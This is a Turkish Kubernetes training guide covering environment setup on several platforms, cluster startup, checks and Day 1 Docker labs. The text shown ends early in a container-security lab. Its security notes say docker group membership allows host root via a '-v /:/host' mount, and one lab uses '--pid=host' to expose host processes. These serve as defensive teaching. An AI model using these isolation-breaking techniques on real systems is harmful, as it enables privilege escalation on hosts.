# Öğrenci Ortam Kurulumu ve Hands-on Lab Kılavuzu

**Kubernetes Temelleri ve Uygulamalı Yönetim Eğitimi**

Bu doküman katılımcıların eğitim öncesi ortam kurulumu ve eğitim sırasında eğitmenle birlikte yapacakları hands-on lab adımlarını içerir.

> **🔐 Güvenlik Perspektifi:** Her lab'ın sonunda (veya içinde) **🔐** işaretli adımlar bulacaksınız. Bunlar, öğrendiğimiz Kubernetes özelliğinin saldırgan ve savunmacı açısından ne anlama geldiğini gösterir.

> **📁 Lab dosyaları:** Tüm lab dosyaları (YAML, Dockerfile, script) eğitim deposundadır. Ortamınızı kurduktan sonra depoyu **tam olarak `~/k8s-lab` klasörüne** klonlayın — kılavuzdaki tüm `cd ~/k8s-lab/...` komutları bu yola göre yazılmıştır:
>
> ```bash
> git clone https://github.com/sauddade/k8s-egitim.git ~/k8s-lab
> ```
>
> Kılavuzdaki `cat > dosya.yaml << 'EOF'` blokları depodaki dosyalarla birebir aynıdır; isterseniz bloğu çalıştırın, isterseniz doğrudan depodaki dosyayı kullanın. PDF/Word'den kopyalarken YAML girintileri bozulabileceği için depodaki dosyalar tercih edilir.

---

## İÇİNDEKİLER

1. [Kurulum Yolunu Seçin (Karar Tablosu)](#1-kurulum-yolunu-seçin)
2. [Windows Kurulumu (Yol A / B / C)](#2-windows-kurulumu)
3. [macOS Kurulumu](#3-macos-kurulumu)
4. [Linux Kurulumu (WSL2 Ubuntu dahil)](#4-linux-kurulumu)
5. [Yol D — Tarayıcı Tabanlı Ortam (GitHub Codespaces)](#5-yol-d--tarayıcı-tabanlı-ortam-github-codespaces)
6. [Standart Cluster Başlatma](#6-standart-cluster-başlatma)
7. [Kurulum Doğrulama](#7-kurulum-doğrulama)
8. [GÜN 1 — Hands-on Lab Komutları](#8-gün-1)
9. [GÜN 2 — Hands-on Lab Komutları](#9-gün-2)
10. [GÜN 3 — Hands-on Lab Komutları](#10-gün-3)
11. [Final Senaryosu — Görevler ve Doğrulama](#11-final-senaryosu)
12. [Günlük Temizlik Komutları](#12-günlük-temizlik)
13. [EK: Hızlı Referans Kartı](#ek-hızlı-referans-kartı)
14. [EK: GUI Araçları (Lens / Headlamp / k9s)](#ek-lens)
15. [EK: Troubleshooting Komutları](#ek-troubleshooting)

---

## 1. KURULUM YOLUNU SEÇİN

> **Amaç:** Herkes aynı komutları çalıştırabilsin. Seçilen yoldan baımsız olarak elinizde şunlar olacak: **bash terminali + Docker (CLI + engine) + minikube + kubectl + helm**. Eğitimdeki tüm komutlar bu ortamda birebir çalışır.

### 1.1 Önce Şirket Politikanızı Kontrol Edin

| Kontrol | Neden önemli? |
|---|---|
| Bilgisayarda yerel yönetici (admin) yetkiniz var mı? | WSL2, Hyper-V, VirtualBox kurulumu bir kez admin ister |
| WSL2 kurumsal politika ile engelli mi? (PowerShell: `wsl --status`) | Windows Yol A/B için gerekli |
| Şirketinizin Docker Desktop lisansı var mı? | Docker Desktop; **250+ çalışanı veya 10M$+ yıllık cirosu olan** şirketlerde ücretli abonelik ister. **Docker Engine (Linux) ve Docker CLI ücretsizdir** — bu yüzden Yol A önerilir |
| Kurumsal proxy / SSL inspection var mı? | Image pull sırasında `x509: certificate signed by unknown authority` hatasına yol açar (bkz. 1.4) |
| Sanallaştırma BIOS'ta açık mı? | Windows: Görev Yöneticisi → Performans → CPU → "Sanallaştırma: Etkin" |

### 1.2 Karar Tablosu

| Durumunuz | Önerilen Yol | Bölüm |
|---|---|---|
| Windows + WSL2 kullanılabiliyor | **Yol A — WSL2 + Docker Engine (Docker Desktop GEREKMEZ)** ✅ önerilen | 2.1 |
| Windows + WSL2 + şirketinizin Docker Desktop lisansı var | Yol B — Docker Desktop + WSL2 | 2.2 |
| Windows + WSL2 engelli, ama Hyper-V veya VirtualBox kurulabiliyor | Yol C — Git Bash + minikube VM (WSL2 ve Docker Desktop yok) | 2.3 |
| macOS (Intel veya Apple Silicon) | Colima (ücretsiz) veya Docker Desktop (lisanslıysa) | 3 |
| Linux | Docker Engine | 4 |
| Hiçbiri mümkün değil (admin yok, sanallaştırma engelli) | **Yol D — GitHub Codespaces** (sadece tarayıcı) | 5 |

### 1.3 Donanım

| | Minimum | Önerilen |
|---|---|---|
| RAM | 8 GB ("Düşük Kaynak" profili) | 16 GB |
| CPU | 4 çekirdek | 8 çekirdek |
| Disk | 40 GB boş | 60 GB boş |

### 1.4 Kurumsal Proxy / SSL Inspection

Şirket ağınız HTTPS trafiğini inceliyorsa (Zscaler, Netskope vb.) image pull ve `curl` komutları sertifika hatası verir. BT ekibinizden kurumsal kök sertifikayı (`.crt`) isteyin:

```bash
# WSL2 / Linux: kök sertifikayı sisteme ekle
sudo cp kurumsal-root-ca.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates
sudo systemctl restart docker

# minikube: sertifikayı cluster'a taşı (minikube start ÖNCESİ)
mkdir -p ~/.minikube/certs
cp kurumsal-root-ca.crt ~/.minikube/certs/
# ve Bölüm 6'daki minikube start komutuna --embed-certs ekleyin

# Proxy değişkenleri (gerekiyorsa ~/.bashrc'ye ekleyin)
export HTTP_PROXY=http://proxy.sirket.local:8080
export HTTPS_PROXY=http://proxy.sirket.local:8080
export NO_PROXY=localhost,127.0.0.1,10.96.0.0/12,192.168.49.0/24,192.168.59.0/24,.svc,.cluster.local
```

---

## 2. WINDOWS KURULUMU

### 2.1 Yol A (Önerilen) — WSL2 + Docker Engine (Docker Desktop gerekmez)

> Docker Engine'i doğrudan WSL2 içindeki Ubuntu'ya kurarız. **Lisans gerektirmez** ve Docker Desktop'tan daha az kaynak tüketir. Eğitimin tamamı Ubuntu terminalinde (veya VS Code'un WSL terminalinde) yapılır.

**Adım 1 — WSL2 + Ubuntu** (PowerShell, *Yönetici olarak*, bir kez):
```powershell
wsl --install -d Ubuntu-24.04
# Bilgisayarı yeniden başlatın; Ubuntu açılınca kullanıcı adı/şifre belirleyin
wsl --set-default-version 2
wsl --status
```

**Adım 2 — WSL2'ye yeterli kaynak verin.** Windows'ta `%UserProfile%\.wslconfig` dosyasını Notepad ile oluşturun:
```ini
[wsl2]
# 16 GB RAM'li makine: 8GB   |   8 GB RAM'li makine: 5GB
memory=8GB
processors=4
swap=4GB
```
Ardından PowerShell'de `wsl --shutdown` çalıştırın ve Ubuntu'yu yeniden açın.

**Adım 3 — systemd açık mı?** (Ubuntu terminali)
```bash
cat /etc/wsl.conf
# [boot] altında systemd=true görünmüyorsa:
printf "[boot]\nsystemd=true\n" | sudo tee /etc/wsl.conf
# PowerShell'de: wsl --shutdown  → Ubuntu'yu tekrar açın
```

**Adım 4 — Docker Engine, kubectl, minikube, helm:** Ubuntu terminalinde **Bölüm 4.1 – 4.5** adımlarını birebir uygulayın.

**Adım 5 — VS Code:** VS Code'u **Windows'a** kurun (https://code.visualstudio.com/), "WSL" eklentisini (`ms-vscode-remote.remote-wsl`) yükleyin. Ubuntu terminalinde `code .` yazınca VS Code WSL modunda açılır ve terminali bash olur. Diğer eklentiler: YAML (redhat), Kubernetes (ms-kubernetes-tools), Docker (ms-azuretools).

> **Tarayıcı erişimi:** WSL2 içinde `kubectl port-forward ... 8080:80` çalıştırdığınızda Windows tarayıcısından `http://localhost:8080` adresine erişebilirsiniz. minikube IP'si (192.168.49.x) Windows'tan doğrudan erişilemez — eğitimde bu yüzden çoğunlukla `port-forward` kullanıyoruz.

### 2.2 Yol B — Docker Desktop + WSL2 (yalnızca şirketinizin lisansı varsa)

1. Yol A'daki Adım 1–2'yi (WSL2 + `.wslconfig`) yapın
2. https://www.docker.com/products/docker-desktop/ → indirin, kurun ("Use WSL 2 instead of Hyper-V" işaretli)
3. Docker Desktop → Settings → Resources → WSL Integration → Ubuntu'yu aktif edin
4. Ubuntu terminalinde: `docker version` ve `docker run --rm hello-world`
5. kubectl, minikube, helm: **Bölüm 4.2 – 4.5** (Ubuntu terminalinde)

> ⚠️ Docker Desktop'ın kendi "Enable Kubernetes" özelliğini **açmayın** — eğitimde minikube kullanıyoruz.

### 2.3 Yol C — WSL2 Kullanılamıyorsa: Git Bash + minikube VM

> Docker Desktop ve WSL2 **olmadan** çalışır. minikube, Hyper-V veya VirtualBox üzerinde küçük bir Linux VM açar; Docker daemon'u o VM'in içinde çalışır. Windows'a sadece ücretsiz **Docker CLI** kurulur ve minikube içindeki daemon'a bağlanır. Terminal olarak **Git Bash** kullanılır, böylece eğitimdeki bash komutları birebir çalışır.
>
> **Gereksinim:** Bir kez admin yetkisi (Hyper-V'yi açmak veya VirtualBox kurmak için). Hyper-V, Windows Pro / Enterprise / Education gerektirir.

**Adım 1 — Sanallaştırma sağlayıcısı** (birini seçin, PowerShell *Yönetici*):
```powershell
# Seçenek 1: Hyper-V (Windows Pro/Enterprise/Education)
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All
# Yeniden başlatın

# Seçenek 2: VirtualBox
winget install Oracle.VirtualBox
```

**Adım 2 — Araçlar** (PowerShell):
```powershell
winget install Git.Git
winget install Kubernetes.kubectl
winget install Kubernetes.minikube
winget install Helm.Helm
winget install Microsoft.VisualStudioCode
```

**Adım 3 — Docker CLI** (sadece istemci, daemon değil):
- https://download.docker.com/win/static/stable/x86_64/ adresinden en güncel `docker-XX.Y.Z.zip` dosyasını indirin
- İçindeki `docker.exe`'yi `C:\Users\<kullanıcı>\bin\` klasörüne kopyalayın ve bu klasörü **kullanıcı PATH**'ine ekleyin
- Docker Compose için: https://github.com/docker/compose/releases → `docker-compose-windows-x86_64.exe` dosyasını `C:\Users\<kullanıcı>\.docker\cli-plugins\docker-compose.exe` olarak kaydedin

**Adım 4 — Git Bash ayarı** (Git Bash'i açın):
```bash
cat >> ~/.bashrc << 'EOF'
# Git Bash'in /etc/... gibi Linux yollarını Windows yoluna çevirmesini engelle
export MSYS_NO_PATHCONV=1
EOF
source ~/.bashrc
```
> ⚠️ Bu ayar yapılmazsa `kubectl exec pod -- cat /etc/os-release` gibi komutlar bozulur.
> ⚠️ `kubectl exec -it` / `docker run -it` gibi interaktif komutlar için Git Bash'i **VS Code terminalinde** veya **Windows Terminal**'de açın. Klasik Git Bash penceresinde "input is not a terminal" hatası alırsanız komutun başına `winpty` ekleyin.

**Adım 5 — Cluster'ı başlatın** (Git Bash):
```bash
# Hyper-V: Git Bash / VS Code'u "Yönetici olarak çalıştır" ile açın
minikube start --driver=hyperv --cni=calico --cpus=4 --memory=6g --disk-size=30g

# VirtualBox:
# minikube start --driver=virtualbox --cni=calico --cpus=4 --memory=6g --disk-size=30g

minikube addons enable metrics-server
minikube addons enable ingress
```

**Adım 6 — Docker CLI'ı minikube içindeki daemon'a bağlayın** (her yeni terminalde):
```bash
eval $(minikube docker-env --shell bash)
docker version          # "Server" bölümü minikube içindeki daemon'u gösterir

# Kalıcı yapmak için (minikube kapalıyken uyarı verir — normal):
echo 'eval $(minikube docker-env --shell bash 2>/dev/null)' >> ~/.bashrc
```

> **Yol C kullanıcıları — eğitim boyunca dikkat:**
> - `docker run -p 8080:80 ...` ile açılan port `localhost`'ta değil **minikube VM'inde** açılır → `http://localhost:8080` yerine `http://$(minikube ip):8080` kullanın
> - `docker build` ile oluşturduğunuz imajlar zaten minikube'ün içindedir → `minikube image load` adımlarını **atlayın**
> - Hyper-V/VirtualBox VM IP'si host'tan erişilebilir; `minikube service <svc> -n <ns> --url` doğrudan çalışır

---

## 3. macOS KURULUMU

### 3.1 Homebrew Kurulumu (yoksa)

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

### 3.2 Container Engine — birini seçin

**Seçenek 1 (ücretsiz, önerilen): Colima**
```bash
brew install colima docker docker-compose docker-buildx

# docker compose / buildx eklentilerini Docker CLI'a tanıt
# (~/.docker/config.json zaten varsa, sadece "cliPluginsExtraDirs" satırını içine ekleyin)
mkdir -p ~/.docker
cat > ~/.docker/config.json << EOF
{
  "cliPluginsExtraDirs": ["$(brew --prefix)/lib/docker/cli-plugins"]
}
EOF

# Colima VM'ini başlat (16 GB RAM'li Mac; 8 GB RAM'li Mac için --memory 5)
colima start --cpu 4 --memory 8 --disk 60

docker version
docker run --rm hello-world
docker compose version
```
> Bilgisayar yeniden başladıktan sonra önce `colima start`, sonra `minikube start` çalıştırın.

**Seçenek 2: Docker Desktop** (yalnızca şirketinizin lisansı varsa)
```bash
brew install --cask docker
# Docker Desktop'ı açın → Settings → Resources → Memory: en az 8 GB
# "Enable Kubernetes" seçeneğini AÇMAYIN (minikube kullanıyoruz)
docker version
```

### 3.3 kubectl, minikube, helm

```bash
brew install kubectl minikube helm
kubectl version --client
minikube version
helm version
```

### 3.4 VS Code + Eklentiler

```bash
brew install --cask visual-studio-code
```

Eklentiler: YAML (redhat), Kubernetes (ms-kubernetes-tools), Docker (ms-azuretools)

> **Apple Silicon (M1–M4):** Tüm araçlar ve eğitimde kullanılan tüm imajlar arm64'ü destekler.
> **Tarayıcı erişimi:** macOS'ta minikube IP'si (192.168.49.x) host'tan doğrudan erişilemez — eğitimde `kubectl port-forward` kullanıyoruz.

---

## 4. LINUX KURULUMU

> Windows Yol A ve Yol B kullanıcıları bu bölümü **WSL2 Ubuntu terminalinde** uygular (Yol B'de 4.1'i atlayın — Docker'ı Docker Desktop sağlar).

### 4.1 Docker Engine (Ubuntu/Debian)

```bash
sudo apt-get update
sudo apt-get install -y ca-certificates curl gnupg

sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
sudo chmod a+r /etc/apt/keyrings/docker.gpg

echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

# Kullanıcıyı docker grubuna ekle (sudo gereksin)
sudo usermod -aG docker $USER
newgrp docker

# WSL2'de systemd kapalıysa servisi elle başlatın: sudo service docker start
docker version
docker run --rm hello-world
```

> 🔐 **Güvenlik notu:** `docker` grubuna üye olmak **root'a eşdeğerdir** — docker socket'e erişen herkes `docker run -v /:/host ...` ile host'ta root olabilir. Eğitim makinesinde bunu bilerek kabul ediyoruz; sunucularda rootless Docker / Podman tercih edin.

### 4.2 kubectl

```bash
ARCH=$(dpkg --print-architecture)                      # amd64 veya arm64
KVER=$(curl -L -s https://dl.k8s.io/release/stable.txt) # eğitmen sabit sürüm duyurursa: KVER=v1.XX.Y
curl -LO "https://dl.k8s.io/release/${KVER}/bin/linux/${ARCH}/kubectl"
curl -LO "https://dl.k8s.io/release/${KVER}/bin/linux/${ARCH}/kubectl.sha256"

# 🔐 İndirilen binary'nin bütünlüğünü doğrula
echo "$(cat kubectl.sha256)  kubectl" | sha256sum --check

sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
rm kubectl kubectl.sha256
kubectl version --client
```

### 4.3 minikube

```bash
ARCH=$(dpkg --print-architecture)
curl -LO "https://storage.googleapis.com/minikube/releases/latest/minikube-linux-${ARCH}"
sudo install "minikube-linux-${ARCH}" /usr/local/bin/minikube
rm "minikube-linux-${ARCH}"
minikube version
```

### 4.4 Helm

```bash
curl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3
# 🔐 İnternetten indirilen script'i çalıştırmadan önce göz atın
less get_helm.sh
chmod 700 get_helm.sh
./get_helm.sh
rm get_helm.sh
helm version
```

### 4.5 Yardımcı Araçlar

```bash
sudo apt-get install -y git openssl
```

### 4.6 VS Code + Eklentiler (sadece native Linux — WSL2 kullanıcıları VS Code'u Windows'a kurar)

```bash
# VS Code kur
wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > packages.microsoft.gpg
sudo install -o root -g root -m 644 packages.microsoft.gpg /etc/apt/keyrings/
sudo sh -c 'echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main" > /etc/apt/sources.list.d/vscode.list'
rm -f packages.microsoft.gpg

sudo apt-get update
sudo apt-get install -y code
```

Eklentiler:
```bash
code --install-extension redhat.vscode-yaml
code --install-extension ms-kubernetes-tools.vscode-kubernetes-tools
code --install-extension ms-azuretools.vscode-docker
code --install-extension redhat.vscode-helm
```

---

## 5. YOL D — TARAYICI TABANLI ORTAM (GitHub Codespaces)

1. GitHub hesabınızla giriş yapın
2. Eğitim deposunu açın (`https://github.com/sauddade/k8s-egitim`) → **Code** → **Codespaces** → **⋯ → New with options** → Machine type: **4-core** → **Create codespace**
3. İlk açılış ~5–8 dk sürer (minikube otomatik başlar; `~/k8s-lab` depoya otomatik bağlanır)
4. Terminalde doğrulayın: `kubectl get nodes`, ardından `bash scripts/preload-images.sh`

**Bilmeniz gerekenler:**
- Ücretsiz kota: kişisel hesaplarda aylık 120 core-saat → 4-core makinede ~30 saat (3 günlük eğitime yeter). **Her gün sonunda codespace'i durdurun** (github.com/codespaces → ⋯ → Stop codespace)
- 30 dk boşta kalırsa codespace uyur; tekrar açtığınızda cluster otomatik başlar (başlamazsa `minikube start`)
- Tarayıcı erişimi: `kubectl port-forward` ile açtığınız port **PORTS** sekmesinde görünür → 🌐 simgesine tıklayın
- `minikube service` ve `minikube tunnel` yerine her zaman `kubectl port-forward` kullanın
- 🔐 Codespace'e şirket verisi veya kimlik bilgisi koymayın — sadece eğitim amaçlıdır


---

## 6. STANDART CLUSTER BAŞLATMA

> Yol A, B, macOS, Linux için ortak komut (Yol C: bkz. 2.3 Adım 5 — sadece `--driver` farklı; Yol D: otomatik). **Calico CNI zorunludur** — Calico olmadan NetworkPolicy nesneleri oluşturulur ama **sessizce hiçbir trafiği engellemez**.
>
> **Kısayol:** Depoyu klonladıysanız bu bölümün tamamı tek komuttur: `bash ~/k8s-lab/scripts/start-cluster.sh` (8 GB RAM: `... start-cluster.sh dusuk`) ve `bash ~/k8s-lab/scripts/preload-images.sh`

**Standart profil (16 GB RAM):**
```bash
minikube start --driver=docker --cni=calico --cpus=4 --memory=6g --disk-size=30g
```

**Düşük kaynak profili (8 GB RAM):**
```bash
minikube start --driver=docker --cni=calico --cpus=2 --memory=3500m --disk-size=30g
```

> Kurumsal kök sertifika eklediyseniz (Bölüm 1.4) komutun sonuna `--embed-certs` ekleyin.

**Eklentiler:**
```bash
minikube addons enable metrics-server    # kubectl top (Gün 3)
minikube addons enable ingress           # Ingress lab'ı (Gün 2)
```

**İmajları önceden indirin** (sınıfta herkes aynı internet çıkışını paylaşır; Docker Hub anonim indirme limitine takılmamak için):
```bash
docker login     # ücretsiz Docker Hub hesabınızla

for img in nginx:1.25 nginx:1.26 busybox:1.36 redis:7-alpine python:3.11-slim \
           nicolaka/netshoot:v0.13 hashicorp/http-echo:1.0; do
  docker pull "$img" && minikube image load "$img"
done
minikube image ls | grep -E "nginx|busybox|netshoot|http-echo|python"
```
> Yol C'de `docker pull` zaten minikube'ün içine indirir; `minikube image load` kısmı gereksizdir (zarar vermez).

**Günlük kullanım:**
```bash
minikube stop      # gün sonunda (cluster durumu ve ayarlar korunur)
minikube start     # ertesi sabah (önceki ayarlarla açılır)
```

> ⚠️ `Docker Desktop has only XXXX MB memory` / `Requested memory allocation exceeds...` hatası: Docker'a ayrılan belleği artırın (Yol A: `.wslconfig`, Yol B: Docker Desktop → Resources, macOS: `colima start --memory`) veya düşük kaynak profilini kullanın.

---

## 7. KURULUM DOĞRULAMA

```bash
echo "=== Docker ==="
docker version --format 'Client: {{.Client.Version}}  Server: {{.Server.Version}}'
docker run --rm hello-world 2>&1 | head -3

echo "=== kubectl / minikube / helm ==="
kubectl version --client
minikube version
helm version --short

echo "=== Cluster ==="
kubectl get nodes -o wide
kubectl get pods -A

echo "=== Calico (NetworkPolicy) ==="
kubectl get pods -n kube-system -l k8s-app=calico-node

echo "=== Ingress Controller ==="
kubectl get pods -n ingress-nginx

echo "=== Metrics Server ==="
kubectl top nodes 2>&1 || echo "Metrics Server henüz hazır değil (birkaç dk bekleyip tekrar deneyin)"

echo "=== Cluster içi DNS + internet erişimi ==="
kubectl run nettest --rm -i --restart=Never --image=nicolaka/netshoot:v0.13 -- \
  sh -c 'nslookup kubernetes.default >/dev/null && echo DNS-OK; curl -sI https://registry.k8s.io | head -1'
```

Beklenen:
- `minikube` node'u **Ready**
- `calico-node` pod'u **Running 1/1**
- `ingress-nginx-controller` pod'u **Running 1/1**
- `kubectl top nodes` CPU/MEM değerleri döner
- Son test `DNS-OK` ve `HTTP/...` satırı yazdırır (sertifika hatası görürseniz → Bölüm 1.4)

---

## 8. GÜN 1

### Container Teknolojileri, K8s Temelleri ve Uygulama Yönetimi

> **Tüm komutlar bash'te çalışır** (Linux, macOS, WSL2 Ubuntu, Git Bash, Codespaces). Dosya oluşturma için `cat > dosya.yaml << 'EOF'` heredoc syntax'ı kullanılır.
>
> **Yol C (Git Bash + minikube VM):** `docker run -p` ile açılan portlara `localhost` yerine `$(minikube ip)` ile erişin.

---

### Lab 1.1 — Docker Temel Komutları (Eğitmen demo'su ile paralel)

```bash
# === Docker Engine doğrulama ===
docker version
docker info

# === Image işlemleri ===
# İmaj indir (pull)
docker pull nginx:1.25

# İndirilen imajları listele
docker images

# İmaj detaylarını gör (layers, env, entrypoint)
docker inspect nginx:1.25

# İmaj katman geçmişini gör
docker history nginx:1.25

# === Container çalıştırma ===
# Container'ı çalıştır (detached mode, port eşleme, environment variable)
docker run -d --name my-nginx -p 8080:80 -e NGINX_HOST=localhost nginx:1.25

# Çalışan container'ları listele
docker ps

# === TARAYICIDA DOĞRULA ===
# Tarayıcıda aç: http://localhost:8080
# Nginx welcome page görmelisin — bu container'ın çalıştığını kanıtlar

# Tüm container'ları (durdurulmuş dahil)
docker ps -a

# === Container inceleme ===
# Container içine gir (interactive)
docker exec -it my-nginx bash
# İçerdeyken:
  ls /usr/share/nginx/html
  cat /usr/share/nginx/html/index.html
  env | grep NGINX
  exit

# Container loglarını gör
docker logs my-nginx

# Canlı log takibi
docker logs -f my-nginx
# Ctrl+C ile çık

# Container detayları
docker inspect my-nginx | grep -A 5 "IPAddress"

# Container resource kullanımı
docker stats my-nginx
# Ctrl+C ile çık

# === Container lifecycle ===
# Container'ı durdur
docker stop my-nginx

# Container'ı yeniden başlat
docker start my-nginx

# Container'ı durdur ve sil
docker stop my-nginx
docker rm my-nginx

# === İmaj yönetimi ===
# İmajı yeniden tag'le
docker tag nginx:1.25 nginx:training

# Tag'lenmiş imajı gör
docker images | grep nginx

# İmajı sil
docker rmi nginx:training

# Sistem temizliği (durdurulmuş container'lar, dangling images)
docker system prune -f

# Disk kullanımı özeti
docker system df

# İmajı sil (en son)
docker rmi nginx:1.25
```

---

### Lab 1.2 — Dockerfile ile Image Build (Temel)

```bash
# Çalışma dizini oluştur
mkdir -p ~/k8s-lab/day1
cd ~/k8s-lab/day1

# app.py oluştur
cat > app.py << 'EOF'
import os
from flask import Flask

app = Flask(__name__)
VERSION = os.environ.get("APP_VERSION", "unknown")
COLOR = os.environ.get("APP_COLOR", "white")

@app.route("/")
def hello():
    return (f"<body style='background:{COLOR}'>"
            f"<h1>Merhaba K8s Egitimi!</h1><p>Version: {VERSION}</p></body>")

@app.route("/health")
def health():
    # Gün 3'teki "hatalı sürüm" senaryosu için: BROKEN=true ise sağlık kontrolü başarısız olur
    if os.environ.get("BROKEN", "false") == "true":
        return "FAIL", 500
    return "OK", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
EOF

# Dockerfile oluştur — temel instruction'lar
cat > Dockerfile << 'EOF'
# Base image (sürümü sabitlenmiş — :latest kullanmıyoruz)
FROM python:3.11-slim

# Çalışma dizini ayarla
WORKDIR /app

# Önce bağımlılıklar: app.py değiştiğinde bu katman cache'den gelir
RUN pip install --no-cache-dir flask==3.0.3

# Uygulama kodunu kopyala
COPY app.py .

# Build-time parametreler (Gün 3'te v2 ve hatalı v3 sürümlerini üretmek için)
ARG APP_VERSION=1.0
ARG BROKEN=false
ENV APP_VERSION=${APP_VERSION} BROKEN=${BROKEN}

# 🔐 Root olmayan kullanıcı — NUMERİK UID (Kubernetes runAsNonRoot bunu doğrulayabilir)
RUN useradd --uid 10001 --no-create-home --shell /usr/sbin/nologin appuser
USER 10001

# Container'ın dinlediği port (dokümantif — gerçekte publish etmez)
EXPOSE 5000

# Container başladığında çalışacak komut
CMD ["python", "app.py"]
EOF

# .dockerignore oluştur (build context'ten gereksiz dosyaları çıkar)
cat > .dockerignore << 'EOF'
*.md
*.log
.git
.gitignore
__pycache__
*.pyc
EOF

# Image build et
docker build -t k8s-demo-app:v1 .

# Build çıktısını gör — layer cache mantığına dikkat
# İkinci build'de cache'den gelecek
docker build -t k8s-demo-app:v1 .

# İmaj katmanlarını gör
docker history k8s-demo-app:v1

# Container çalıştır ve test et
docker run -d --name demo-app -p 5000:5000 k8s-demo-app:v1
# macOS: "address already in use" hatası → 5000 portunu AirPlay Receiver kullanıyor; -p 5050:5000 ile çalıştırıp localhost:5050'yi kullanın

# Uygulamayı test et
curl http://localhost:5000
curl http://localhost:5000/health

# TARAYICIDA DOĞRULA:
# http://localhost:5000 → Flask app sayfasını görmelisin (Version: 1.0)
# http://localhost:5000/health → "OK" görmelisin

# Environment variable değiştirerek yeni container çalıştır
docker run -d --name demo-app-v2 -p 5001:5000 -e APP_VERSION=2.0 k8s-demo-app:v1
curl http://localhost:5001
# Version: 2.0 görmelisin

# Container hangi kullanıcıyla çalışıyor?
docker exec demo-app id
# uid=10001 → root değil ✅

# Temizlik (container'ları sil)
docker stop demo-app demo-app-v2
docker rm demo-app demo-app-v2
# ⚠️ k8s-demo-app:v1 imajını SİLMEYİN — Gün 3'te Kubernetes'te kullanacağız
```

---

### Lab 1.2b — Dockerfile Derinlemesine ve Docker Compose

> **Bu lab, Docker'ı derinlemesine anlamak ve Kubernetes'e geçiş için köprü oluşturur.**

```bash
cd ~/k8s-lab/day1

# === Multi-Stage Build + Distroless ===
# Amaç: build araçlarını (pip, shell, paket yöneticisi) final image'a taşımamak
#        → daha küçük image + daha küçük saldırı yüzeyi

cat > Dockerfile.multistage << 'EOF'
# Stage 1: Builder — pip sadece burada var
FROM python:3.11-slim AS builder
WORKDIR /build
RUN pip install --no-cache-dir --target=/build/deps flask==3.0.3
COPY app.py .

# Stage 2: Final — distroless: shell yok, paket yöneticisi yok, root değil (nonroot)
FROM gcr.io/distroless/python3-debian12:nonroot
WORKDIR /app
COPY --from=builder /build/deps /app/deps
COPY --from=builder /build/app.py .
ENV PYTHONPATH=/app/deps APP_VERSION=2.0-distroless
EXPOSE 5000
CMD ["app.py"]
EOF

# Multi-stage build et
docker build -f Dockerfile.multistage -t k8s-demo-app:distroless .

# İmaj boyutlarını karşılaştır — distroless belirgin şekilde küçük olmalı
docker images | grep k8s-demo-app

# Çalıştır ve test et
docker run -d --name demo-ms -p 5002:5000 k8s-demo-app:distroless
curl http://localhost:5002

# 🔐 Shell yok → saldırgan uygulamayı ele geçirse bile elinde araç yok
docker exec -it demo-ms sh
# Beklenen hata: exec: "sh": executable file not found

# === ENTRYPOINT vs CMD farkı ===

# v1 imajında sadece CMD var → tamamen override edilir
docker run --rm k8s-demo-app:v1 echo "CMD override edildi"
# echo çalışır, app.py çalışmaz

# distroless imajda ENTRYPOINT = python3 → verdiğimiz argümanlar python'a gider
docker run --rm k8s-demo-app:distroless -c "print('ENTRYPOINT sabit (python), sadece CMD degisti')"

# Temizlik
docker stop demo-ms
docker rm demo-ms

# === Docker Compose: Çoklu Container ===
# Amaç: web + redis iki container'ı tek dosyadan çalıştır
# Bu, Kubernetes YAML mantığına geçişin ilk adımıdır

cat > docker-compose.yml << 'EOF'
services:
  web:
    image: nginx:1.25
    ports:
      - "8080:80"
    depends_on:
      - cache
    environment:
      - REDIS_HOST=cache

  cache:
    image: redis:7-alpine
    # 🔐 Port dışarıya publish EDİLMEDİ: Redis'e sadece compose ağındaki web erişebilir
EOF

# Compose dosyasını doğrula
docker compose config

# İki container'ı birlikte başlat
docker compose up -d

# Çalışan container'ları gör
docker compose ps

# Logları gör (iki servis)
docker compose logs -f
# Ctrl+C ile çık

# Servis içine gir
docker compose exec web bash
# İçerdeyken:
  getent hosts cache      # cache → IP çözümlenir
  exit
# Not: cache hostname'i Docker DNS ile çözümlenir — aynı K8s Service DNS gibi!

# Compose durdur ve sil
docker compose down

# Not: k8s-demo-app imajlarını silmeyin (Lab 1.2c ve Gün 3'te kullanılacak)
```

> **Geçiş Notu:** Docker Compose'da `cache` servisine `http://cache` ile eriştiniz — Docker otomatik DNS ile servis adını IP'ye çevirdi. Kubernetes'te de aynı mantık vardır: Service adı DNS olarak çözümlenir. Docker Compose tek makinede çalışır, Kubernetes ise çoklu makinede. Bu benzerlik, şimdi Kubernetes'e geçişi kolaylaştıracak.

---

### Lab 1.2c — 🔐 Container Güvenliği

> **Amaç:** Container izolasyonunun sınırlarını, imajlardan sır sızmasını ve zafiyet taramasını görmek.

```bash
cd ~/k8s-lab/day1

# --- 1. Container root olarak mı çalışıyor? ---
docker run --rm nginx:1.25 id          # uid=0(root)  ← birçok resmi imaj root çalışır
docker run --rm k8s-demo-app:v1 id     # uid=10001    ← bizim imaj

# --- 2. Namespace izolasyonu (PID namespace) ---
docker run --rm busybox:1.36 ps                      # sadece kendi process'i
docker run --rm --pid=host busybox:1.36 ps | head -15  # 🔴 host'un TÜM process'leri
# --pid=host, --net=host, --privileged, -v /:/host → izolasyonu kırar.
